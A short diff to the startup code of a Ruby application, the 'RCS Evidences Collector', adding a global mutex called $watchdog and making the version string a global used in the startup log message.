@@ -37,6 +37,9 @@ class Application
       #puts "Cannot find 'trace.yaml' using the default one (#{ty})"
     end
 
+    # the global watchdog
+    $watchdog = Mutex.new
+
     # ensure the public and log directory are present
     Dir::mkdir(Dir.pwd + PUBLIC_DIR) if not File.directory?(Dir.pwd + PUBLIC_DIR)
     Dir::mkdir(Dir.pwd + '/log') if not File.directory?(Dir.pwd + '/log')
@@ -55,8 +58,8 @@ class Application
 
     begin
       build = File.read(Dir.pwd + '/config/VERSION_BUILD')
-      version = File.read(Dir.pwd + '/config/VERSION')
-      trace :fatal, "Starting the RCS Evidences Collector #{version} (#{build})..."
+      $version = File.read(Dir.pwd + '/config/VERSION')
+      trace :fatal, "Starting the RCS Evidences Collector #{$version} (#{build})..."
 
       # config file parsing
       return 1 unless Config.instance.load_from_file
